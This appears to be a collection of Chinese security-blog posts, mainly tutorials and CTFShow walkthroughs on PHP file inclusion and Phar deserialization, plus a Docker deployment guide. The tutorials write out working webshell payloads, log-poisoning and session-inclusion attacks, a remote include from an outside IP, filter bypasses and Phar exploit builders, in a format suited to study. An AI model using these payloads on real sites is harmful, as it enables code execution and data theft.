新启程有幸被木爷指点了一番，也非常荣幸朱老师指点了我很久，真的感受到了自己的很多不足，而且差点路就走偏了。\n\nJava 安全很多时候不只是反序列化，还有很多代码审计；还有很多很多东西。\n\n最近一直在看反序列化，我确实感觉自己基础不错，但是确实我发现了自己代码审计这块很不好，其实当初在给师傅们培训的时候我就感受到了，自己 Java Web 确实不够 扎实，万丈高楼平地起。\n\n木爷告诉我有时候是需要结果论，而不是过程论的，确实，这个时代是看结果的。\n\n\n    \n然后要养成独立思考的习惯，注意，这个真的是独立思考。少看安服崽的文章，真的害人不浅。比如，怎么说呢？你学一个 log4j2 的漏洞，你学他，不光学，还要设想如何 bypass。\n比如你知道了 fastjson 漏洞，一开始你懂了原理，后续的链子漏洞就可以从漏洞发现者的角度去思考了，并且多多思考 bypass；这真的很重要。\n\n\n还有，Java 安全不光是反序列化，反序列化相对于 Java 安全，就像 SQL 注入相对于渗透测试，很好防。\n多看代码审计，多多理解，静下心来，好好沉淀，安研还有一丝希望。\n其他项目也就不要管了，专注于一个方向就好了，冲！！！\n2022.11.6和心理咨询师沟通了一次，感觉很多东西得到了认知，很舒服，之前一直觉得自己好像对安全不是那么有热情了，其实不是这样的。\n有热情与没有热情，它们不是 0 分和 100 分的区别。\n因为热情是一个很唯心主义的东西，你觉得有就是有，你觉得没有就是没有。所以可能只是热情低，但不是没有热情。\n再说到爱好与工作，很多人说把爱好变成饭碗之后，会变得不热情。但其实还有那么多人找工作是为了养家糊口，自己作者自己热爱的事情难道不是一种热爱吗？\n解决了困扰了我很久的心理问题。\n2023.2.12自放寒假自己状态就不是特别好，所幸最近调整过来了\n","categories":["碎碎念"],"tags":["碎碎念"]},{"title":"文件包含学习","url":"/2023/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/","content":"PHP 文件包含学习\n\n0x01 前言\n之前一直想补这个漏洞，结果现在才开始\n\n0x02 漏洞相关漏洞成因&#x2F;原理后端编程人员一般会把重复使用的函数写到单个文件中，需要使用时再直接调用此文件即可，该过程也就 被称为文件包含。\n文件包含的存在使得开发变得更加灵活和方便，但同时也带了安全问题，导致客户端可以远程调用文件，造成文件包含漏洞。这个漏洞在 php 中十分常见，其他语言也同样存在\n漏洞危害\n造成任意文件读取的信息泄露\n命令执行\n\n漏洞分类1、本地文件包含漏洞\n简单理解就是网页本身存在着恶意文件，我们对其进行调用，从而获取信息等，倾向于信息泄露\n2、远程文件包含漏洞（需要 php.ini 开启了 allow_url_fopen 和allow_url_include）\n这种情况下，网页本身不存在恶意文件，我们构造恶意文件进行包含，包含的文件是第三方服务器的文件。\n漏洞相关函数\n主流文件包含 php 一些函数的含义： \n\ninclude() :执行到 include() 才包含文件，找不到包含文件只产生警告，还会接着运行后面的脚本 \nrequire(): 只要程序一运行就会包含文件，找不到包含文件则会报错，并且脚本终止运行 \n\ninclude_once():执行到 include()才包含文件，找不到包含文件只产生警告，还会接着运行后面的脚本；_once()后缀表明只会包含一次，已包含则不会再包含\nrequire_once()：只要程序一运行就会包含文件，找不到包含文件则会报错，并且脚本终止运行 _once()后缀表明只会包含一次，已包含则不会再包含\n漏洞利用最常用的是伪协议\nfile:// 协议：\n        条件 allow_url_fopen:off/on  allow_url_include :off/on\n        作用：用于访问本地文件系统。在include()/require()等参数可控的情况下\n             如果导入非php文件也会被解析为php\n        用法：\n            1.file://[文件的绝对路径和文件名]\n            2.[文件的相对路径和文件名]\n            3.[http：//网络路径和文件名]\n\nphp:// 协议：\n        常见形式：php://input php://stdin php://memory php://temp\n        条件 allow_url_include需要 on allow_url_fopen:off/on\n        作用：php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter\n            和php://input，php://filter用于读取源码，php://input用于执行php代码\n        php://filter参数详解：resource=（必选，指定了你要筛选过滤的数据流）     \n        read=（可选）    write=（可选）\n        对read和write，可选过滤器有string.rot13、string.toupper\n        、string.tolower、string.strip_tags、convert.base64-encode \n        &amp; convert.base64-decode\n         用法举例：php://filter/read=convert.base64-encode/resource=flag.php\n                    网址+?page=php://filter/convert.base64-encode/resource=文件名\n\nzip:// bzip2:// zlib:// 协议：\n        条件：allow_url_fopen:off/on      allow_url_include :off/on\n        作用：zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件\n            更重要的是不需要指定后缀名\n        用法：zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]\n             compress.bzip2://file.bz2\n             compress.zlib://file.gz\n        其中phar://和zip://类似\n\ndata:// 协议：\n        条件：allow_url_fopen:on    allow_url_include :on\n        作用：可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。\n        用法：data://text/plain,            data://text/plain;base64,\n        举例：data://text/plain,&lt;?php%20phpinfo();?>\n             data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n\n0x03 文件包含基础实战无限制文件包含&lt;?php\n\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    include($file);\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125; \n\npayload\n?file&#x3D;..&#x2F;flag\n\n\n\n\n这里从漏洞利用的角度来说也是一种任意文件读取漏洞，但是在实际环境当中，可能服务端会定死后缀为 .php，如下代码所示\n\n有后缀的文件包含&lt;?php\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    include $file.'.php';\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n\n如果想要继续进行任意文件读取，需要想办法截断后面的 .php\n因此我们此时可以通过以下几种方法来对其进行截断（ 需要 magic_quotes_gpc=off，PHP小于5.3.4）\n%00截断\n\n路径长度截断\n# Linux 需要文件名长于 4096，Windows 需要长于 256\n\n点号截断\n# 只适用 Windows，点号需要长于 256\n\n远程文件包含\n大致意思是，可以请求恶意的文件，通过远程文件包含\n\n利用前提：allow_url_fopen=On，allow_url_include=On\n在服务器上建立恶意文件 evil.txt，内容如下\n&lt;?php\nphpinfo();\n?>\n\n远程读取\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;file_include&#x2F;remoteInclude.php?file&#x3D;http:&#x2F;&#x2F;81.68.120.14:777&#x2F;evil.txt\n\n\n\n0x04 文件包含结合伪协议php:&#x2F;&#x2F;filter 协议利用条件：只是读取，所以只需要开启 allow_url_fopen，对 allow_url_include 不做要求\n用 php://filter 伪协议本质上的作用还是文件读取，但是它可以读取全部内容，相比于之前来说，如果直接读的话，很有可能只读到一行\n还是一样的代码，payload：\n?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php\n\n\n\nphp:&#x2F;&#x2F;input 协议可以访问请求的原始数据的只读流, 将 post 请求中的数据作为 PHP 代码执行\n利用条件：需要开启 allow_url_include=on，对 allow_url_fopen 不做要求\npayload&#96;\n?file=php://input\n\n这里我用 hackbar 没打通，似乎是只能用 bp 才能打通\n\n\nzip:&#x2F;&#x2F; 伪协议zip:// 可以访问压缩文件中的文件\n条件： 使用 zip 协议，需要将 # 编码为 %23，所以需要 PHP Version &gt;&#x3D;5.3.0，要是因为版本的问题无法将 # 编码成 %23，可以手动把 # 改成&#96;%23。&#96;&#96;\npayload\n?file&#x3D;zip:&#x2F;&#x2F;[压缩文件路径]#[压缩文件内的子文件名]\n\n在本地新建一个文件 zip.php，并且压缩成 zip.zip 压缩包\nzip.php\n&lt;?php  \nphpinfo();  \n?>\n\npayload\n?file&#x3D;zip:&#x2F;&#x2F;zip.zip%23zip.php\n\n\n\n这一种攻击的前提是存在文件上传的功能，我可以上传一个包含恶意 PHP 文件的 zip 包，通过 zip 包绕过文件上传的检测，再用文件包含去打；利用角度上来说还是有一些苛刻。\nphar:&#x2F;&#x2F; 伪协议与 zip:// 协议类似，但用法不同，zip:// 伪协议中是用 # 把压缩文件路径和压缩文件的子文件名隔开，而 phar:// 伪协议中是用 / 把压缩文件路径和压缩文件的子文件名隔开，即\n?file&#x3D;phar:&#x2F;&#x2F;[压缩文件路径]&#x2F;[压缩文件内的子文件名]\n\n用 phar 打的 payload，当然 / 可以用 %2f 编码\n?file&#x3D;phar:&#x2F;&#x2F;zip.phar&#x2F;zip.php\n\n\n\n利用条件也是相对苛刻\ndata://text/plain 伪协议和 php 伪协议的 php://input 类似，也可以执行任意代码，但利用条件和用法不同\n条件：allow_url_fopen=On，allow_url_include=On\n用法1：?file=data:text/plain,&lt;?php 执行内容 ?&gt;用法2：?file=data:text/plain;base64,编码后的 php 代码，也就是上文的 &lt;?php 执行内容 ?&gt;\n\n\n如果是用 base64 的方法打的，需要将 base64 的部分进行 URL 编码，才能打\n\n\nfile 伪协议打法 ?file=file=../../，很基础的攻击方式，和 SSRF 差不多，这里不再多说\n通过伪协议绕过 die() 函数这个题目会在 ctfshow web87 里面详细说明\n0x05 一些 getshell 等骚姿势日志包含\n同理的 fd 文件包含，environ 文件包含都和日志包含差不多。php 以 cgi 方式运行，这样 environ 才会保持 UA 头。\n\n利用条件：\n需要知道服务器日志的存储路径，且日志文件可读。\n\n为啥这个能利用呢？首先我们每一次访问 host&#x2F;服务端，都会被日志所记载，那么如果我们在 UA（用的最多），或者其他字段当中插入恶意 php 代码；那么在日志被 php include() 调用的时候，就会自动执行里面的代码。\n\n后续会在 ctfshow 当中展示例题\nsession 包含session 概念基础\n原理上还是因为 可控 + 可读\n\n可读：php 的 session 文件的保存路径可以在 phpinfo 的 session.save_path 看到。\n\n\n前提是开启了 session.serialize_handler = php 或 session.serialize_handler = php_serialize\nsession.php\n&lt;?php  \nsession_start();  \n$username = $_POST['username'];  \n$_SESSION[\"username\"] = $username;  \n?>\n\nPOST 发包，username=Drunkbaby\n\n\n服务端会对用户名的内容进行序列化存储，但是这个存储只会存储 username 里面的值进行了序列化存储，即 s:9:&quot;Drunkbaby&quot; 没有对变量名做任何处理，对变量名做处理的方式如下\n&lt;?php\nini_set('session.serialize_handler', 'php_serialize');    \nsession_start();\n$username = $_POST['username'];\n$_SESSION[\"username\"] = $username;\n?>\n\n并设置 session.serialize_handler=php_binary\n同样发包 POST，username=Drunkbaby\n\n\nsession 包含实例写一段 demo 代码\nsessionVul.php\n&lt;?php  \nsession_start();  \nerror_reporting(0);  \nif (isset($_POST['username'])) &#123;  \n    $_SESSION['username'] = $_POST['username'];  \n&#125;  \n\nif (isset($_GET['file'])) &#123;  \n    include($_GET['file']);  \n&#125;  \n\n?>\n\n明显可控的恶意地方是 username，我们尝试发包，在 username 字段中插入恶意代码\n&lt;?php%20eval($_REQUEST[&#39;drunkbaby&#39;]);?&gt;\n\n并且要修改 Cookie: PHPSESSID 的值，因为数据保存的文件名是 sess_PHPSESSID，这里我把它修改成了 evil；发包。\n\n\n接着进行文件包含，去包含存储 session 的文件\n\n\n这是非常理想的漏洞条件，实际中代码中会对用户的会话信息做一定的处理后才进行存储。\n\n如对用户 session 信息进行编码或加密\n如代码没有 session_start() 进行初始化操作，服务器也就无法生成 session 文件\n\nsession base64 编码如何攻击这也就是上文提到的，在实际场景中，肯定会对 session 进行编码操作\nbase64Session.php\n&lt;?php  \nsession_start();  \nerror_reporting(0);  \n  \nif (isset($_POST['name'])) &#123;  \n    $_SESSION['name'] = base64_encode($_POST['name']);  \n&#125;  \n  \nif (!empty($_SESSION['name'])) &#123;  \n    echo \"&lt;div class='res'>&lt;h3>success!&lt;br>&lt;br>name:\".base64_decode($_SESSION['name']);  \n&#125;  \n  \n  \nif (isset($_GET['file'])) &#123;  \n    include($_GET['file']);  \n&#125;  \n  \n?>\n\n按照原理来说，我们写入的恶意 session 会进行 base64 编码，保存到 sess_PHPSESSID 这一文件中；至于取出来，可以用 php://filter 伪协议，大致的 payload 可以是\n?file=php://filter/convert.base64-decode/resource=../tmp/tmp/sess_evil\n\n但是实际上并没有进行命令执行，经过报错信息的查看会发现是 base64 解码时出现了错误。这里就涉及到了 base64 解码的原理。（其实很多 Java 题里面也是这样的）\n在 base64 编码时，每4个字节一组组成一个24位的数据流，解码为3个字节。即4个字节每6组解码为3个字节每8组。如果遇到不属于 base64 编码表里的字符，会跳过这些字符，将合法的字符拼接后解码\n\n解决这一步的方法，从结论上来说只需要 username 这个恶意字段经过 base64 编码之后的长度能够整除4即可，至于推理过程可以看这一篇文章。\n\nhttps://www.anquanke.com/post/id/201177#h2-8\n发包\nusername&#x3D;qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm%3C%3Fphp+eval%28%24_REQUEST%5B%27drunkbaby%27%5D%29%3B%3F%3E\n\n在经过 base64 编码后的文件内容为：\nusername|s:116:&quot;cWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtPD9waHAgZXZhbCgkX1JFUVVFU1RbJ2RydW5rYmFieSddKTs&#x2F;Pg&#x3D;&#x3D;&quot;;\n\n一整个长度为 116，符合被 4 整除\n\n\n接着用 php://filter 伪协议去文件包含\n\n\n值得注意的是，这里 session.serialize_handler = php，如果设置成 session.serialize_handler = php_serialize 也可以通过类似的方法攻击。\nNo session_start()，也就是 session.upload_progress 的攻击方式要结合条件竞争打，这里可以简单提及一下原理以及攻击思路\n原理\n当一个网站存在文件包含漏洞，但是并没有用户会话。即代码层未输入session_start()。攻击者可借助 Session Upload Progress，因为 session.upload_progress.name 是用户自定义的，POST 提交 PHP_SESSION_UPLOAD_PROGRESS 字段，只要上传包里带上这个键，PHP 就会自动启用 Session。同时在 Cookie 中设置 PHPSESSID 的值。这样，请求的文件内容和命名都可控。\n当文件上传结束后，php 会立即清空对应 session 文件中的内容，这会导致我们包含的很可能只是一个空文件，所以我们要利用条件竞争，在 session 文件被清除之前利用。\n0x06 CTFShow 例题web78payload\n?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php\n\nweb79增添了代码\n$file = str_replace(\"php\", \"???\", $file);\n\n大小写绕过 php，构造 payload 如下\n?file&#x3D;phP:&#x2F;&#x2F;input\n\n\n\n同理 data:// 也可以\nweb80过滤了 “php” 和 “data”\n$file = str_replace(\"php\", \"???\", $file);    \n$file = str_replace(\"data\", \"???\", $file);\n\n和上一题的 payload 一样\n\n\nweb81新过滤了 :  如此一来无法使用伪协议打，可以用日志包含\n$file = str_replace(\"php\", \"???\", $file);    \n$file = str_replace(\"data\", \"???\", $file);    \n$file = str_replace(\":\", \"???\", $file);\n\nUA 作为恶意内容插入，读日志命令执行\nUser-Agent: &lt;?php system($_GET[1]);?>\n\n\n\nweb82-86竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件\nweb87代码如下\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    $content = $_POST['content'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    $file = str_replace(\":\", \"???\", $file);\n    $file = str_replace(\".\", \"???\", $file);\n    file_put_contents(urldecode($file), \"&lt;?php die('大佬别秀了');?>\".$content);\n\n    \n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n\n这里 bypass 的方法是二次 url 编码，第一次 url 编码，是 web 服务端自己自动完成的；这样就可以很轻松的绕过 str_replace() 的检测，而经过 web 服务端 url 解码之后的内容，经过 urldecode()，转换为恶意 payload\ncontent 里面放命令执行的语句，file 里面通过伪协议\n?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;hack.php\n\ncontent&#x3D;&lt;?php eval($_POST[1]);\n\n第一次这么打是有问题的，问题就是前面说的 base64 编码的问题，因为前面还会解析 phpdie 这六个字符，所以需要我们再填充两位进去\n\n\n\n填充两个字符后\n\n\n\n直接连🐎\n\n\n拿到 flag\n\n\nweb88简单的一道远程包含，过滤的关键字内容如下\nif(preg_match(\"/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\", $file))&#123;  \n        die(\"error\");  \n&#125;\n\n根据关键字过滤来看，data:// 伪协议也可以打，但是要注意编码后的 payload 不能含有 = 和 +\npayload\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg&amp;1=ls\n\n\n\nweb116misc + lfi\nmp4 用 foremost 分解出一个 png，里面是一张源代码\n\n\n\n直接用 php://filter 读取\n\n\n\nweb117过滤了相当多，不过 filter 关键字没被过滤\nfunction filter($x)&#123;  \n    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x))&#123;  \n        die('too young too simple sometimes naive!');  \n    &#125;  \n&#125;\n\n这里用到了一个新的 bypass 方法 ———— iconv() 函数\n\niconv() 函数的用法如下\n\niconv(string $in_charset, string $out_charset, string $str): string\n\n将字符串 str 从 in_charset 转换编码到 out_charset；这里直接用先知那篇文章里的从 UCS-2LE 到 UCS-2BE 的转换\n本地生成一个 payload, 注意原始长度必须是偶数\n&lt;?php \n$text = '&lt;?php system($_GET[11]);?>';\necho iconv(\"UCS-2LE\", \"UCS-2BE\", $text);\n?>\n\n编码后的 payload\n?&lt;hp pystsme$(G_TE1[]1;)>?\n\n写入文件的 payload\n?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php\n\n\n\n接着命令执行\n\n\n0x07 小结总体利用来说并不算难，挺有意思的一个漏洞\n0x08 Refhttps://www.jianshu.com/p/e6f59f3f01b8https://exp10it.cn/2022/08/ctfshow-web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-writeup/\n","categories":["PHP"],"tags":["PHP"]},{"title":"记一次用docker部署Springboot的经历","url":"/2022/05/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%A8docker%E9%83%A8%E7%BD%B2Springboot%E7%9A%84%E7%BB%8F%E5%8E%86/","content":"docker部署Springboot\n\n记一次用docker部署Springboot的经历0x01 前言\n之前看有文章说是用什么什么插件，其实根本没这么麻烦\n\n我是跟着这位师傅的教程走的，但是有几个地方还是不太清晰，也容易踩坑的。挂一下师傅文章的链接：使用 Docker 部署 Spring Boot\n\n不多逼逼，开启正题\n\n0x02 创建一个简单的 Springboot 项目第一步，先创建一个简单的 Springboot 项目，我这里是用 IDEA 起的，其他也是大同小异吧。过程我就省略了，如果有问题的师傅可以私聊我一下。\n接着，我们按照 Springboot 的封装模式来，创建一个 Controller 文件夹，并创建 DockerTestController，在其中添加如下代码。\n@RestController  \npublic class DockerController &#123;  \n    @RequestMapping(&quot;&#x2F;hello&quot;)  \n    public String hello()&#123;  \n        return &quot;hello Docker&quot;;  \n &#125;  \n  \n&#125;\n\n\n\n\n我们运行的 application 不需要更改\n\n\n这里先测试一下，可不可以访问 127.0.0.1:8080&#x2F;hello\n\n页面是会返回 “hello Docker”\n0x03 打包成 jar 文件打包成 jar 文件很简单，操作如图所示，点击 package 即可。\n\n\n\n因为我们的需求是用 docker 部署 springboot 程序，所以我们一定是要把 jar 文件放到装有 docker 的机器上的，我这里用的是 Linux 的机器，Windows 的我还没有用过。\n\n通过 sftp 或者其他的方式传过去。\n0x04 重头戏，使用 Docker 部署1. Dockerfile 的编写首先我们需要编写 Dockerfile，Dockerfile 的名字就叫 Dockerfile，一个文件夹里面只可以存在一个 Dockerfile，Dockerfile 这里就按照如下写即可，把自己的 jar 文件替换进去。编写如下\nFROM openjdk:11   // 这里如果 openjdk 不对就使用 java:11\nCOPY *.jar /drunkgoat-0.0.1-SNAPSHOT.jar   // 自己的 jar 文件\n  \nCMD [\"--server.port=7000\"]   // 自己设置端口\n  \nEXPOSE 7000   // 对外暴露端口\n  \nENTRYPOINT [\"java\",\"-jar\",\"/drunkgoat-0.0.1-SNAPSHOT.jar\"]\n\n这里算是踩了个坑吧，那位师傅的教程第一行写的是 java:11，然后我 docker build 的时候就一直报这个错误：\nmanifest for java:11 not found: manifest unknown: manifest unknown\n\n后面换了个角度，用了 openjdk:11 果然可以！\n2. 构建自己的镜像(images)就一句命令 \nsudo docker build -t springboot-demo .  \n// -t 后面是你想给这个容器取的名\n\n\n\n\ndocker build 这里要怎么分类我还是不太会，如果有懂的师傅可以说一下\n\n3. 运行镜像 同样的，一句命令 docker run -d -p 7000:8080 --name \"这里给要 run 中的容器取名\" springboot-demo(也就是你前面命名的) dockerid\n run 之后，我们通过 docker ps 来查看正在 run 的容器\n\n\n\n再访问就通啦！\n\n访问 ip+端口加 hello 接口即可 ~\n","categories":["环境搭建"],"tags":["环境搭建"]},{"title":"Phar 反序列化学习","url":"/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/","content":"Phar 反序列化简单学习\n\n\nPHP 反序列化0x01 关于 PharPhar 含义Phar 本质上还是一种压缩包，但它是 PHP 的压缩文档，类似于 jar 包在 Java 里面差不多的样子。它可以把多个文件存放至同一个文件中，无需解压，PHP 就可以进行访问并执行内部语句。\n\n默认开启版本 PHP Version &gt;&#x3D; 5.3\n\nPhar 文件结构\n在说文件结构之前，我们可以先通过这个脚本生成一个 .phar 文件\n\nProducePhar.php\n&lt;?php\nclass test&#123;\n    public $name=\"qwq\";\n    function __destruct()\n    &#123;\n        echo $this->name . \" is a web vegetable dog \";\n    &#125;\n&#125;\n$a = new test();\n$a->name=\"drunkbaby\";\n$tttang=new phar('drunkbaby.phar',0);//后缀名必须为phar\n$tttang->startBuffering();//开始缓冲 Phar 写操作\n$tttang->setMetadata($a);//自定义的meta-data存入manifest\n$tttang->setStub(\"&lt;?php __HALT_COMPILER();?>\");//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测\n$tttang->addFromString(\"test.txt\",\" \");//添加要压缩的文件\n$tttang->stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘\n?>\n\nPhar 文件结构大致可分为四个部分\n1、Stub//Phar文件头\n2、manifest//压缩文件信息\n3、contents//压缩文件内容\n4、signature//签名\n\n下面细说一些\nstubStub 是 Phar 的文件标识，也可以理解为它就是 Phar 的文件头，这个 Stub 其实就是一个简单的 PHP 文件，它的格式具有一定的要求，具体如下\nxxx&lt;?php xxx; __HALT_COMPILER();?>\n\n这行代码的含义，也就是说前面的内容是不限制的，但在该 PHP 语句中，必须有__HALT_COMPILER()，没有这个，PHP 就无法识别出它是 Phar 文件。这个其实就类似于图片文件头，比如 gif 文件没有 GIF89A 文件头就无法正确的解析图片，010 Editor 里面的 phar 文件头如图\n\n\nmanifesta manifest describing the contents，用于存放文件的属性、权限等信息。这里也是反序列化的攻击点，因为这里以序列化的形式存储了用户自定义的 Meta-data\n\n\n在我们上面生成的 phar 文件中，manifest 的内容如图\n\n\ncontents用于存放 Phar 文件的内容\nSignature[optional] a signature for verifying Phar integrity (phar file format only),签名(可选参数)，位于文件末尾，具体格式如下\n\n\n从官方文档中不难看出，签证尾部的 01 代表 md5 加密，02 代表 sha1 加密，04 代表 sha256 加密，08 代表 sha512 加密\n\n\n当我们修改文件的内容时，签名就会变得无效，这个时候需要更换一个新的签名更换签名的脚本\nfrom hashlib import sha1\nwith open('test.phar', 'rb') as file:\n    f = file.read()\t\ns = f[:-28] # 获取要签名的数据\nh = f[-8:] # 获取签名类型和GBMB标识\nnewf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)\nwith open('newtest.phar', 'wb') as file:\n    file.write(newf) # 写入新文件\n\n0x02 Phar 反序列化漏洞漏洞成因Phar 反序列化之所以存在，是因为 Phar 文件中的 manifest 字段存储了序列化的数据，这其实就是用户的 mete-data，PHP 使用 phar_parse_metedata() 函数解析 meta 数据时，会调用 php_var_unserialize() 函数进行反序列化。具体解析代码如下\nphp-src&#x2F;ext&#x2F;phar&#x2F;phar.c\n\n\n那么该如何触发反序列化呢，一般是配合 Phar 伪协议，伪协议使用较多的是一些文件操作函数，只有这些函数能进行反序列化操作，单纯的 phar:// 的伪协议并不能触发反序列化，如 fopen()、copy()、file_exists() 等，具体如下图\n\n\n通过两个小 demo 来证明一下 file_get_contents() 可用：\n&lt;?php\nclass test&#123;\n    public $name=\"\";\n    public function __destruct()\n    &#123;\n        echo('the name is  ');\n        echo ($this->name);\n        echo '&lt;br>';\n        echo '   Destruct called';\n    &#125;\n&#125;\n$tttang = file_get_contents('phar://drunkbaby.phar/test.txt');\necho $tttang;\n\n\n\n成功触发，同样可以试一试其他的函数\n&lt;?php\nclass test&#123;\n    public $name=\"\";\n    public function __destruct()\n    &#123;\n        echo('the name is  ');\n        echo ($this->name);\n        echo '&lt;br>';\n        echo '   Destruct called';\n    &#125;\n&#125;\n$drunkbaby = file_exists('phar://drunkbaby.phar/test.txt');\necho $drunkbaby;\n\n\n\n这里会打印出的数据有之前在 test.txt 中写入的内容 空格，以及该打印出的 $this-&gt;name 的内容 —— drunkbaby\n所以此处我们可以用一种别样的方式来触发反序列化，回想一下之前 PHP 反序列化的时候，是需要一个 unserialize() 反序列化的入口类的，但是在 Phar 反序列化当中，这一过程更为隐蔽。\n\n接下来我们简单总结一下利用条件\n\n利用条件1）需要入口，也就是上面能够对 phar 文件进行反序列化的地方。\n2）存在可利用的魔术方法，用魔术方法作为跳板，这其实也就是 POP 链的思想。\n3）文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。\n简单 DemoVulDemo1.php\n&lt;?php\nif (isset($_GET['filename']))&#123;\n    $filename = $_GET['filename'];\n    class MyClass &#123;\n        var $output = 'echo \"lol\"';\n        function __destruct()\n        &#123;\n            eval($this->output);\n        &#125;\n        file_exists($filename);\n    &#125;\n&#125;\nelse &#123;\n    highlight_file(__FILE__);\n&#125;\n\n这道 Demo 就是完美满足我们 phar 反序列化攻击的需求，首先存在入口函数 —— file_exists()，其次存在能够利用的魔术方法，魔术方法这里其实写了一个命令执行。并且毫无过滤。\n所以我们直接构造恶意的 phar 文件，EXP 如下\n&lt;?php\n// phar.readonly无法通过该语句进行设置: init_set(\"phar.readonly\",0);\nclass MyClass&#123;\n    var $output = '@eval($_GET[1]);';\n&#125;\n\n$o = new MyClass();\n$filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行\nfile_exists($filename) ? unlink($filename) : null;\n$phar=new Phar($filename);\n$phar->startBuffering();\n$phar->setStub(\"GIF89a&lt;?php __HALT_COMPILER(); ?>\");\n$phar->setMetadata($o);\n$phar->addFromString(\"foo.txt\",\"bar\");\n$phar->stopBuffering();\n?>\n\n正常情况下应该是会给我们提供文件上传的功能点，这里我没有写，但是可以直接利用，payload 为\n?filename&#x3D;phar:&#x2F;&#x2F;poc.phar&amp;1&#x3D;phpinfo();\n\n\n\n0x03 Phar 反序列化 Bypass 的攻防二相性对 Phar 内文件检测白名单我们利用Phar反序列化的第一步就是需要上传Phar文件到服务器，而如果服务端存在防护，比如这种\n$_FILES[\"file\"][\"type\"]==\"image/gif\"\n\n这里的 bypass 比较简单，核心语句是这个\n$phar->setStub(\"GIF89a&lt;?php __HALT_COMPILER(); ?>\");\n\n这和上面例题所说的 exp 是一样的\n绕过 Phar 等关键字检测Phar反序列化中，我们一般思路是上传Phar文件后，通过给参数赋值为Phar:&#x2F;&#x2F;xxx来实现反序列化，而一些防护可能会采取禁止参数开头为Phar等关键字的方式来防止Phar反序列化，示例代码如下\nif (preg_match(\"/^php|^file|^phar|^dict|^zip/i\",$filename)&#123;\n    die();\n&#125;\n\n我们的办法是使用各种协议来进行绕过，具体如下\n1、php://filter/read=convert.base64-encode/resource=phar://test.phar\n//即使用filter伪协议来进行绕过\n2、compress.bzip2://phar:///test.phar/test.txt\n//使用bzip2协议来进行绕过\n3、compress.zlib://phar:///home/sx/test.phar/test.txt\n//使用zlib协议进行绕过\n\n绕过 __HALT_COMPILER 检测我们在前文初识Phar时就提到过，PHP 通过 __HALT_COMPILER来识别 Phar 文件，那么出于安全考虑，即为了防止 Phar 反序列化的出现，可能就会对这个进行过滤，示例代码如下\nif (preg_match(\"/HALT_COMPILER/i\",$Phar)&#123;\n    die();\n&#125;\n\n这里的话绕过思路有两个1、将 Phar 文件的内容写到压缩包注释中，压缩为 zip 文件，示例代码如下\n&lt;?php\n$a = serialize($a);\n$zip = new ZipArchive();\n$res = $zip->open('phar.zip',ZipArchive::CREATE); \n$zip->addFromString('flag.txt', 'flag is here');\n$zip->setArchiveComment($a);\n$zip->close();    \n?>\n\n2、将生成的Phar文件进行gzip压缩，压缩命令如下\ngzip test.phar\n\n压缩后同样也可以进行反序列化\n0x04 实战例题[CISCN2019 华北赛区 Day1 Web1]Dropbox\n首先通过正常的登录注册业务进到正常的逻辑当中去，发现有个文件上传的业务点。\n\n上传 shell.jpeg 可以上传成功，并且存在下载与删除的业务\n\n\n但是目前无法确定 shell.jpeg 的路径保存在何处，所以我们先看看下载的业务，这里是存在任意文件读取的漏洞的，如图\n\n\n猜测路径 filename=/../var/www/html/upload.php 这里读取到了文件上传的源码，同样，下载和删除应该也有源码，读一下，且包含了 class.php，都逐一读取一遍。\n但是这里 $_SESSION[&#39;sandbox&#39;] 不知道是什么，所以并不是一道单纯的文件上传的题目。\n在读取 class.php 的时候，发现最后 close() 函数调用了 file_get_contents() 函数，这个函数我们之前提过，很有可能是一个 Phar 反序列化的题目。且题目并没有过滤 phar 后缀的文件，修改 MIME 绕过即可\n\n\n所以这里我们需要先找链子，危险函数是 class.php#close()，发现是 download.php#echo $file-&gt;close(); 调用了它，所以下载处应该是对应的漏洞入口。\n\n接下来就是构造 EXP\n\n&lt;?php\nclass File&#123;\n    public $filename;\n    public function close() &#123;\n        return file_get_contents($this->filename);\n    &#125;\n&#125;\n$a = new File();\n$a->filename=\"/f*\";\n$tttang=new phar('drunkbaby.phar',0);//后缀名必须为phar\n$tttang->startBuffering();//开始缓冲 